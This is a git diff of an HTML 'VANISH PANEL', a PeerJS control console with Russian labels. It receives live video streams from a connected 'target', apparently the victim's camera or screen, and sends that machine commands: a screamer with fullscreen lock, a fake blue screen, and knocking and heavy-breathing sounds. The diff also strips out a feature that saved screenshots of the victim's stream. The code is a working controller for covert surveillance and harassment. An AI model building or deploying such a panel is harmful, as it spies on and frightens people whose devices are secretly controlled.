@@ -1,41 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VANISH TERMINAL v9.0</title>
+    <title>VANISH PANEL</title>
     <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; display: flex; margin: 0; height: 100vh; }
-        #side { width: 320px; background: #0a0a0a; border-right: 1px solid #222; padding: 20px; box-shadow: 2px 0 15px rgba(0,255,0,0.1); }
-        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; background: #000; overflow-y: auto; }
-        video { width: 100%; border: 2px solid #333; border-radius: 10px; background: #111; transition: 0.3s; }
-        video:hover { border-color: #0f0; }
-        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; text-transform: uppercase; font-weight: bold; font-size: 12px; }
+        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
+        #side { width: 300px; background: #0a0a0a; border-right: 1px solid #222; padding: 20px; }
+        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; background: #000; overflow-y: auto; }
+        video { width: 100%; border: 2px solid #333; border-radius: 10px; background: #111; }
+        .btn { padding: 15px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; text-transform: uppercase; }
         .btn:hover { background: #0f0; color: #000; }
         .btn-red { color: #ff0050; border-color: #ff0050; }
         .btn-red:hover { background: #ff0050; color: #fff; }
-        .status-box { border: 1px solid #333; padding: 10px; margin-bottom: 20px; font-size: 11px; }
     </style>
 </head>
 <body>
     <audio id="notif" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>
 
     <div id="side">
-        <h2 style="color: #ff0050;">VANISH CORE</h2>
-        <div id="status" class="status-box">SCANNING FOR TARGETS...</div>
-        
-        <button class="btn btn-red" onclick="send('SCR')">💀 SCREAMER (F11 + LOCK)</button>
-        <button class="btn" onclick="takeSnapshot()">📸 СДЕЛАТЬ СКРИНШОТ</button>
-        <button class="btn" onclick="send('BSOD')">💻 ВЫЗВАТЬ BSOD</button>
-        
-        <p style="font-size: 10px; color: #444;">УПРАВЛЕНИЕ ЗВУКОМ:</p>
+        <h2 style="color: #ff0050;">TERMINAL</h2>
+        <div id="status" style="border: 1px solid #333; padding: 10px; margin-bottom: 20px;">ОЖИДАНИЕ...</div>
+        <button class="btn btn-red" onclick="send('SCR')">💀 СКРИМЕР</button>
+        <button class="btn" onclick="send('BSOD')">💻 СИНИЙ ЭКРАН</button>
+        <p>ЗВУКИ:</p>
         <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
         <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
     </div>
 
     <div id="monitor"></div>
-
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
 
     <script>
         const MY_ID = '09062012';
@@ -44,8 +37,8 @@
 
         peer.on('connection', conn => {
             activeConn = conn;
-            document.getElementById('notif').play().catch(()=>{});
-            document.getElementById('status').innerText = "TARGET CONNECTED\nIP: LOGGED\nSTATUS: ACTIVE";
+            document.getElementById('notif').play();
+            document.getElementById('status').innerText = "ЦЕЛЬ В СЕТИ";
             document.getElementById('status').style.color = "#0f0";
         });
 
@@ -54,36 +47,14 @@
             call.on('stream', stream => {
                 const video = document.createElement('video');
                 video.autoplay = true;
-                video.playsinline = true;
                 video.srcObject = stream;
-                video.id = "stream-" + Date.now();
                 document.getElementById('monitor').appendChild(video);
             });
         });
 
         function send(t) { if(activeConn) activeConn.send({ type: t }); }
         function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
-
-        // Функция для создания скриншота из видеопотока
-        function takeSnapshot() {
-            const videos = document.getElementsByTagName('video');
-            if(videos.length === 0) return alert("Нет активных потоков!");
-            
-            const canvas = document.getElementById('hidden-canvas');
-            const video = videos[videos.length - 1]; // Берем последний поток (обычно это экран)
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const link = document.createElement('a');
-            link.download = 'snapshot_' + Date.now() + '.png';
-            link.href = canvas.toDataURL();
-            link.click();
-        }
-
-        window.onclick = () => { console.log("System Initialized"); };
+        window.onclick = () => { console.log("System Online"); };
     </script>
 </body>
 </html>
